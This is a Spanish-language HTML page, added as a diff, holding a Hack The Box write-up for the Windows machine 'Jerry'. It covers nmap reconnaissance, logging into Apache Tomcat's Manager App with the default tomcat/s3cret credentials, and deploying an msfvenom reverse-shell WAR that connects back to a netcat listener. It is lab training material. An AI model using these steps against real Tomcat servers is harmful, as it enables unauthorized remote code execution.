@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Jerry | HTB</title>
+
+  <meta name="description" content="Writeup de la máquina Jerry de Hack The Box: enumeración, explotación y escalada de privilegios." />
+  <meta property="og:title" content="Jerry | HTB" />
+  <meta property="og:description" content="Writeup de la máquina Jerry de Hack The Box: enumeración, explotación y escalada de privilegios." />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://phantomcrypter.github.io/writeups/jerry.html" />
+  <meta property="og:image" content="https://phantomcrypter.github.io/assets/img/og-default.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link rel="icon" type="image/png" href="../assets/img/favicon.png" />
+
+  <!-- Estilos principales -->
+  <link rel="stylesheet" href="../assets/css/style.css" />
+  <!-- Fuente y resaltado de código -->
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js" defer></script>
+  <script defer>document.addEventListener('DOMContentLoaded', function () { hljs.highlightAll(); });</script>
+</head>
+<body class="glitch-bg">
+  <nav class="navbar">
+    <ul class="nav-list">
+      <li><a href="../index.html">Inicio</a></li>
+      <li><a href="../projects.html">Proyectos</a></li>
+      <li><a href="../blog.html">Blog</a></li>
+      <li><a href="../notes.html">Notas</a></li>
+      <li><a href="../writeups.html">Writeups</a></li>
+      <li><a href="../about.html">Sobre mí</a></li>
+      <li><a href="../contact.html">Contacto</a></li>
+    </ul>
+            <br>
+  </nav>
+
+  <main class="blog-container">
+    <section class="blog-post">
+      <div class="terminal-box">
+        <a href="../writeups.html">← Volver a Writeups</a>
+        <h1>Jerry // Windows // Easy // HTB</h1>
+
+        <div class="img-placeholder">
+          <img src="../assets/img/writeups/jerry/jerry_banner.webp" alt="Banner de la máquina Jerry de Hack The Box">
+        </div>
+
+        <article>
+
+          <section id="reconocimiento">
+            <h2>Fase de reconocimiento</h2>
+            <p>Primero procedo a hacer un análisis de puertos con nmap hacia el servidor:</p>
+            <pre><code class="language-bash">sudo nmap -sS -p- --open --min-rate 5000 10.129.136.9 -Pn -oA Jerry-recon</code></pre>
+            <ul>
+              <li><strong style="color:aquamarine">-sS</strong>: Escaneo SYN (más rápido y discreto)</li>
+              <li><strong style="color:aquamarine">-p-</strong>: Escaneo de todos los puertos</li>
+              <li><strong style="color:aquamarine">--open</strong>: Mostrar solo puertos abiertos</li>
+              <li><strong style="color:aquamarine">--min-rate 5000</strong>: Establecer una tasa mínima de paquetes por segundo</li>
+              <li><strong style="color:aquamarine">-Pn</strong>: Omite el ping de host, lo que hace que el escaneo sea más rápido</li>
+              <li><strong style="color:aquamarine">-oA Jerry-recon</strong>: Guardar los resultados en formato XML, Nmap y Grepable</li>
+            </ul>
+            <br>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/jerry/jerry_nmap.webp" alt="Resultado del escaneo de puertos con nmap mostrando el puerto 8080 abierto" loading="lazy">
+            </div>
+            <br>
+            <p>Una vez reconocido que solo el puerto 8080 está abierto, podemos revisar qué servicios y versiones están corriendo en ese puerto:</p>
+            <pre><code class="language-bash">sudo nmap -sCV -p 8080 10.129.136.9 -oA PortScan</code></pre>
+            <ul>
+              <li><strong style="color:aquamarine">-sCV</strong>: Escaneo de scripts y detección de versión</li>
+              <li><strong style="color:aquamarine">-p 8080</strong>: Escaneo del puerto 8080</li>
+              <li><strong style="color:aquamarine">-oA PortScan</strong>: Guardar los resultados en formato XML, Nmap y Grepable</li>
+            </ul>
+            <br>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/jerry/jerry_nmap2.webp" alt="Detección de versión de nmap mostrando Apache Tomcat en el puerto 8080" loading="lazy">
+            </div>
+            <br>
+            <p>Al ver el escaneo, se puede observar que en el puerto 8080 se está ejecutando un servicio de Apache Tomcat, por lo que podemos intentar acceder a la web para sacar más información.</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/jerry/jerry_web.webp" alt="Página principal de Apache Tomcat en el puerto 8080" loading="lazy">
+            </div>
+            <br>
+
+            <h3>¿Qué es Apache Tomcat?</h3>
+            <p>Apache Tomcat es un servidor web y contenedor de servlets de código abierto desarrollado por la Apache Software Foundation. Es utilizado para ejecutar aplicaciones web basadas en Java, especialmente aquellas que utilizan servlets y JavaServer Pages (JSP). Tomcat implementa las especificaciones de Java Servlet y JSP, lo que permite a los desarrolladores crear aplicaciones web dinámicas y robustas.</p>
+            <p>Si exploramos las opciones de <strong style="color:blueviolet">Server Status</strong>, <strong style="color:blueviolet">Manager App</strong> y <strong style="color:blueviolet">Host Manager</strong>, podemos ver que nos solicitan credenciales para ingresar.</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/jerry/jerry_tomcat2.webp" alt="Ventana de autenticación de Apache Tomcat solicitando credenciales" loading="lazy">
+            </div>
+            <br>
+          </section>
+
+          <section id="explotacion">
+            <h2>Fase de explotación</h2>
+            <p>Al no saber qué tipo de credenciales podemos usar, podemos buscar en internet información sobre credenciales por defecto para Apache Tomcat.</p>
+            <p>Revisando por internet, me encontré con <a href="https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown" target="_blank" rel="noopener noreferrer">este recurso</a>, el cual contiene varias opciones útiles para crear un diccionario en caso de ser necesario.</p>
+            <p>Al fallar el login, Tomcat muestra la siguiente información:</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/jerry/jerry_tomcat3.webp" alt="Página de error 401 de Tomcat con credenciales de ejemplo visibles" loading="lazy">
+            </div>
+            <br>
+            <p>En esa página podemos extraer información valiosa, ya que podemos ver los roles disponibles y lo que puede hacer cada uno. Además, si ponemos atención, nos muestra unas credenciales por defecto que podemos usar: <strong style="color:blueviolet">tomcat</strong> como usuario y <strong style="color:blueviolet">s3cret</strong> como contraseña.</p>
+            <p>Una vez probamos esas credenciales en el apartado de <strong style="color:blueviolet">Manager App</strong>, podemos acceder al panel de control de Apache Tomcat.</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/jerry/jerry_tomcat4.webp" alt="Panel Manager App de Tomcat tras iniciar sesión" loading="lazy">
+            </div>
+            <br>
+            <p>Si investigamos un poco sobre las diferentes opciones de explotación de este panel, vemos que solo requerimos un archivo WAR para desplegar una aplicación web en Apache Tomcat.</p>
+            <p>Pero esta vez vamos a meter una reverse shell dentro de un archivo WAR.</p>
+            <p>Para lograrlo, encontré una reverse shell en formato WAR en la página de <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings</a>. Sustituye <code>&lt;TU_IP_TUN0&gt;</code> por la IP de tu interfaz VPN de HTB:</p>
+            <pre><code class="language-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;TU_IP_TUN0&gt; LPORT=4242 -f war -o reverse.war</code></pre>
+            <p>Esto genera el archivo WAR que subiremos al panel de control de Apache Tomcat para ejecutarlo y obtener acceso remoto al sistema.</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/jerry/jerry_tomcat5.webp" alt="Generación del archivo reverse.war con msfvenom" loading="lazy">
+            </div>
+            <br>
+            <p>Una vez creado el archivo WAR, lo subimos desde la sección de despliegue del panel:</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/jerry/jerry_tomcat6.webp" alt="Formulario de subida de archivos WAR en el Manager App" loading="lazy">
+            </div>
+            <br>
+            <p>Con el archivo seleccionado, usamos la opción <strong style="color:blueviolet">Deploy</strong> y veremos cómo aparece un nuevo path en la lista de aplicaciones con el nombre del archivo WAR.</p>
+            <p>Para este punto ya debemos tener el listener activo en nuestro sistema para recibir la reverse shell:</p>
+            <pre><code class="language-bash">nc -lvnp 4242</code></pre>
+            <p>Con la escucha activa, hacemos clic en el nuevo path para activar la shell.</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/jerry/jerry_tomcat7.webp" alt="Aplicación reverse desplegada en la lista del Manager App" loading="lazy">
+            </div>
+            <br>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/jerry/jerry_tomcat8.webp" alt="Listener de netcat recibiendo la conexión de la reverse shell" loading="lazy">
+            </div>
+            <br>
+            <p>Una vez dentro del sistema, solo queda buscar las banderas: si ejecutamos <code>whoami</code> veremos que somos <code>NT AUTHORITY\SYSTEM</code>, y ambas banderas se encuentran en el mismo lugar.</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/jerry/jerry_shell.webp" alt="Shell como NT AUTHORITY\SYSTEM y lectura de las banderas" loading="lazy">
+            </div>
+            <br>
+            <p>Con esto concluimos la máquina Jerry, de dificultad fácil en Windows, la cual se enfoca principalmente en la explotación de vulnerabilidades en Apache Tomcat y no tanto en explotar un servidor Windows.</p>
+            <p>
+              <span style="font-family:'Fira Code',monospace;color:aquamarine;user-select:none">C:\&gt;</span> También pueden visitar el video explicativo de la máquina en mi canal de YouTube:
+              <a href="https://youtu.be/1ChPhH4Uff4" target="_blank" rel="noopener noreferrer">Resolución de la Máquina Jerry | HTB</a>
+            </p>
+          </section>
+
+        </article>
+
+        <footer class="post-footer">
+          <span class="post-date"><time datetime="2026-11-05">2026-11-05</time></span>
+          <div class="post-social">
+            <p>[ contact ]</p>
+            <a href="https://www.twitch.tv/kallrize" target="_blank" rel="noopener noreferrer">twitch</a>
+            <a href="https://www.youtube.com/@kallrizeklr5364" target="_blank" rel="noopener noreferrer">Youtube</a>
+            <a href="https://www.linkedin.com/in/gabrielp%C3%A9rez-959645213" target="_blank" rel="noopener noreferrer">linkedin</a>
+          </div>
+        </footer>
+      </div>
+            <br>
+    </section>
+  </main>
+</body>
+</html>
